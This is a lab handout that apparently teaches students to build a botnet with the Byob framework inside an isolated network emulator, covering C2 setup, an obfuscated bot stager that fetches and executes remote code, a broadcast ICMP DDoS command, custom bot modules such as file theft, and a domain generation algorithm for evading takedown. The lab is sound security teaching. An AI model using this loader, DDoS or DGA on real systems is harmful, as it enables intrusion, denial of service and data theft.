# Botnet Lab


## Background: Brief Introduction of Botnet 

Recent years, Botnet have become one of the biggest threats to security systems today. Botnet is a combination of the words "robot" and "network". Cybercriminals often use special Trojan horse viruses to destroy the security of multiple users' computers, control each computer, and then combine all the infected computers into a "robot" network that can be remotely managed by criminals. In this lab, students need to construct their own botnet in experimental environment, so they can understand how botnet works. Because developing a botnet is quite complicated work, so we will use an open source botnet framework called Byob in our lab. Byob framework is designed to allow students and developers to easily implement their own code and add cool new features without having to write a C2 server or Remote Administration Tool from scratch.


## Overview of the Underlying Emulator

The lab will be based on a pre-built emulator that we 
provide. Here we will introduce this emulator, showing 
students what are included. We will not write this part now, 
as we haven't finalized what pre-built emulator 
we are going to use. 


## Task 1. Deploying Basic Botnet

A command-and-control (C2 or C&C) server is a computer controlled by an attacker or cybercriminal which is used to send commands to systems compromised by malware or vulnerability. Normally, in Botnet structure, C2 server is a important component, and there are two type of model for Botnet: (1) Centralized model and (2) Peer-to-Peer model. In this lab, we will use Centralized model as example to learn how Botnet works.

### Task1.A: Setup C2 server

Please download the ```Labsetup.zip``` file to your VM from the lab’s website, unzip it, enter the ```Labsetup``` folder, all the codes needed in this lab are in this folder. 

In order to focus on Botnet service itself, in this lab, we are going to load a existed network emulator, it has already setup network configuration, so we can build our own Botnet service on top of that. First, we run ```python3 MiniInternet.py```, we can get the dump file called ```mini-internet.bin```. Next, in the ```botnet-in-mini-internet.py```, we would load this bin file to reuse the mini-internet emulator. The following code shows how to load an exist emulator into our emulator:

```
from seedsim.core import Emulator
from seedsim.services import BotnetService, BotnetClientService
from seedsim.services import DomainRegistrarService
from seedsim.compiler import Docker

sim = Emulator() # create a emulator instance

sim.load('mini-internet.bin') # invoke load method to import mini internet emulator
```

After that, In this exist emulator(mini-internet), we already know we have many Autonomous Systems . We select AS150 as C2 server and install our C2 service on a host in it. The following code shows how can we deploy a C2 server in emulator.

```
bot = BotnetService()    # Create botnet service instance
bot_client = BotnetClientService() # Create botnet client service instance


base_layer = sim.getLayer('Base') # Get base layer from a existed emulator
as_150 = base_layer.getAutonomousSystem(150) # Get AS150 object
hosts = as_150.getHosts() # Get all host names in AS150
c2_server_ip = "10.150.0.71"

bot.installByName(150, hosts[0]) # Deploy C2 service in a host that in AS150
```
According to the convention of IP address, if we want to deploy C2 service on the host in AS150, we know its IP address is ```10.150.0.71```, since in mini-internet, there is only one host in AS150, so we just need to feed ```hosts[0]``` as host name into ```installByName```, then the emulator would know should be installed in where.


### Task1.B: Setup bot client

Next, we are going to setup bots client in our emulator. In this task, we will deploy 5 bots on AS151,AS152,AS153,AS154,and AS155, each Autonomous System will has 1 bot. One thing should keep in mind is that all the bots must be connectable with C2 server, which is the host in AS150, Because all of the behaviors in bots are from C2 server, which means C2 server need to be able to communicate with bots. The following code show how can we setup bot client by using our pre-built emulator.

```
for asn in [151,152,153,154,155]:
    asn_base = base_layer.getAutonomousSystem(asn) # Get base layer in each of AS
    c = bot_client.installByName(asn, asn_base.getHosts()[0]) # Deploy bot in the first host
    c.setServer(c2_server_ip) # Tell bot who is the C2 server
```

In the previous task, we have the IP address of C2 server ```10.150.0.71```, so we just need to use ```installByName``` API to attach our botnet service on specific host. With bot client installation, we also need to invoke ```setServer``` to setup Botnet client, because we have to tell Botnet who is the controller. After that, we just need to add ```bot``` and ```bot_client``` layer on our emulator, that will be good for entire setup process.

```
sim.addLayer(bot)
sim.addLayer(bot_client)
sim.render()

###############################################################################

sim.compile(Docker(), './botnet-in-mini-internet')
```

### Task1.C: How it works

Now we run ```python3 botnet-in-mini-internet.py```, our emulator will generate a folder named ```botnet-in-mini-internet```. Enter this folder, and we can bring up our custom botnet docker container cluster. In the following, we list some of the commonly used commands related to Docker and Compose. Since we are going to use these commands very frequently, we have created aliases for them in the .bashrc file (in our provided SEEDUbuntu 20.04 VM).

```
$ docker-compose build # Build the container image
$ docker-compose up # Start the container
$ docker-compose down # Shut down the container

// Aliases for the Compose commands above
$ dcbuild # Alias for: docker-compose build
$ dcup # Alias for: docker-compose up
$ dcdown # Alias for: docker-compose down
```

When we run ```docker-compose up```, all the containers will be running in the background, and we need to get a shell on C2 server container. First, we use ```dockps | grep 150.0.71``` to find out the container ID of C2 server, and then use ```docksh <id>``` to attach that container. After that, we can go to ```/tmp/byob/byob``` folder to launch our Botnet C2 console by using command ```python3 server.py --port 445```.

The port 445 is the port that will be used for communication with bots. This port will be binded when we starting the all the container. The above command is just to attach to our C2 console. At the same time, the bots program would also run in the background, so wait a couple of minutes in C2 console, we will see our bot client join to our botnet (type ```sessions``` command in C2 console to check. ). That means we can control those bot and send any commands to them.

So how it works? Let's jump to perspective of bots client and see what happend in client side. First, bot client will run ```python3 /tmp/BotClient.py``` in the background when we bring up containers (It should be waiting until network configuration ready). We can attach to any of bot client container and open that file. The following is the code of ```BotClient.py```.

```
import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWBgYCgtyskvSM3TUM8oKSmw0tc3NNAzNDXQM9AzN7QyMTHT1y8uSUxPLSrWTzLz0CuoVNfUK0pNTNHQBAAMzxEz')))))
```
There is one critical factor of bot program is the size. Because in real world, bots can be many types of system, such as IoT device, busybox, Android and so on, so from attacker perspective, they do not want to bot getting infection failed due to some dependencies issues. Therefore, it is important to reduce the size of bot program, in order to make it more stable. As we can see the above code. It will invoke ```exec``` to run another piece of code. That code has been decoded for some times and eventually run it. We can print out what it is after decoding. Here is the out put.

```
urlopen('http://10.150.0.71:446//stagers/b6H.py').read()
```
Basically, bot program will fetch another python file from remote server, which is also our C2 server, but the port is 446 (another port binded by C2 server, used for providing payload), through HTTP protocol. The ```b6H.py``` is our real bot main program, it contains how the bot communicate with C2 server, and running different types of jobs (like re-connect to C2 server). In this case(Byob framework), the communication protocol between C2 and bots is TCP, it use a JSON to maintain the commands, including ```task_id```, ```command``` etc fields. Just keep that in mind, in real world, the communication method can be various, because attack and defense are a continuous process, if a communication protocol is detected by the firewall, the attacker will change another communication protocol to bypass the detection.


## Task 2. Launching Attacks Using Botnet

In this task, we will conduct student to launch a simple DDoS attack in our botnet. We've already deployed a simple ICMP DDoS module in every bots, the file is in ```/tmp/ddos.py```. Firstly, use ```docksh <id>``` to attach C2 server and back to the C2 console, type ```broadcast python3 /tmp/ddos.py 10.155.0.71``` command to run DDoS module (make sure all of the bots have join our botnet session). After running this command, all the bots will receive C2's command and initiate DDoS attack to 10.155.0.71. The ```ddos.py``` is a simple ICMP DDoS module. Then we can attach to the container of victim (10.155.0.71), and type ```tcpdump icmp``` to monitor network package. We will see there are many of ICMP packet sent from all of bots, which means our attack is successful. The following commands show entire process.

```
//Bash window 1
$ docksh <c2 server container ID>
$ python3 server.py --port 445
//waiting for bots online
$ broadcast python3 /tmp/ddos.py 10.155.0.71

//Bash window 2
$ docksh <victim's container ID>
$ tcpdump icmp
```

 - Let's try to find 2-3 interesting things to do here.


## Task 3. Writing Your Own Programs

In this task, students need to write their own program and push to each bot, then use C2 console to launch the program by using ```broadcast``` command. After launching, each of bots should automatically execute this program. In your own program, you can do something that you think is interesting, for example: Steal a secret file, encrypt a file etc. The following code snippet shows how can we put your program in each bot. ***(Notice: In bot client environment, only support Python3)***

```
...
for asn in [151,152,153,154,155]:
    asn_base = base_layer.getAutonomousSystem(asn)
    c = bot_client.installByName(asn, asn_base.getHosts()[0])
    c.setServer(c2_server_ip)
    c.setModule(filename='myprog.py', file_src='./myprog_in_local.py')

``` 

The only one thing we need to do is that use ```setModule``` API after you have installed a bot client on a host. The first argument ```filename``` is the name that you want to stored in bot docker container, the file will eventually deploy in ```/tmp/filename```. The second argument ```file_src``` is your file that existed on your VM(or computer). For example, if I wrote a program
called ```myprog_in_local.py``` in my VM, and set ```filename='myprog.py'```. After starting all the container, the file will copy to ```/tmp/myprog.py``` in each of bots.


## Task 4. Evading Firewalls

In Botnet technology, there is a important concept called DGA (Domain generation algorithms). DGA are algorithms seen in various families of malware that are used to periodically generate a large number of domain names that can be used as rendezvous points with their command and control servers. The large number of potential rendezvous points makes it difficult for law enforcement to effectively shut down botnets, since infected computers will attempt to contact some of these domain names every day to receive updates or commands.

In this task, we will apply DGA technology on our emulator to simulate evading Firewalls, so students can understand how it works. Normally, the group of domain should be changed everyday in real world. However, in our lab, we would reduce the timeslot be to 5 minutes, in order to let students easily observe the process. We have already implemented DGA feature in our emulator. The following code shows how can we setup a Domain Registrar service and enable DGA function in bots client.

```
###########################################
def dga() -> list:
    #Generate 10 domains for the given time.
    domain_list = []
    domain = ""
    import math, datetime
    today = datetime.datetime.utcnow()
    hour = today.hour
    day = today.day
    minute = today.minute
    minute = int(math.ceil(minute/5))*5

    for i in range(16):
        day = ((day ^ 8 * day) >> 11) ^ ((day & 0xFFFFFFF0) << 17)
        hour = ((hour ^ 4 * hour) >> 25) ^ 16 * (hour & 0xFFFFFFF8)
        minute = ((minute ^ (minute << 13)) >> 19) ^ ((minute & 0xFFFFFFFE) << 12)
        domain += chr(((day ^ hour ^ minute) % 25) + 97)
        if i > 6:
            domain_list.append(domain+ ".com")

    return domain_list

##########################################
base_layer = sim.getLayer('Base')  # Get base layer from mini-internet
as_150 = base_layer.getAutonomousSystem(150) # Get Autonomous System 150
hosts = as_150.getHosts() # Get host list on AS150, we will choose one of them to install C2 server.

bot.installByName(150, hosts[0]) # install C2 server on that host.

for asn in [151,152,153,154,155]: # Install bot client on hosts in each of autonomous system
    asn_base = base_layer.getAutonomousSystem(asn)
    c = bot_client.installByName(asn, asn_base.getHosts()[0])
    c.setServer(enable_dga=True, dga=dga) # Enable dga feature, pass our dga function in to client.


domain_registrar.installByName(161, "s_com_dns") # Install Domain Registrar service on com TLD server host.
```
On the above code, we firstly defined a function called dga, this function would generate 10 domains based on current time. In every 5 minutes, the funtion will generate different a group of domain. Other than that, like a previous task, setup everything for emulator. The only one difference is that when we use setServer to setup bot client, we need to turn on the enable_dga (set it to True), and pass our dga function to the bot client. In the emulator, the bot client will use this dga function to get a set of domain and randomly choose one of them, if that domain cannot be connectd, bot program would generate it and randomly choose one domain again to connect.

Build and start all the containers again and use the same way in previous task to attach to C2 server, and run ```python3 server.py --port 445``` to attach C2 console. But at this time, there is no bot seesion join to our botnet, that's because in the bots clients container, they would continously connect to the domain which generate by DGA function, but these domain have not point to our C2 server, so we need to register these domain. Firstly, in ```Labsetup``` folder, we run ```python3 dga.py``` to get a group of domain that same with bot client will connect to. Then in the VM browser, we can visit our domain registrar service that have installed before. We known the IP address of domain registrar servuce is ```10.161.0.71```, so we can directly visit ```http://10.161.0.71``` website, and register those domain that generated by dga.py. Point these domain to our C2 server: ```10.150.0.71```.

Because in every 5 minutes, domain group will be change, so we need to re-run dga.py and keep eye on it, in order to make sure domain group not flush, if we get a new group of domain, we have to re-register them.

After registration, back to C2 console, we will see our bot client join to our botnet (type ```sessions``` command in C2 console to check. ). That means we can control those bot and send any commands to them.

 - Activities: Please use at least 2 C2 server, and using domain registrar service to randomly register 3-5 domain names that pointing to any of these 2 C2 servers (can be evenly distribute). Provide your observation.
 - Using DGA to launch DDoS attack again.
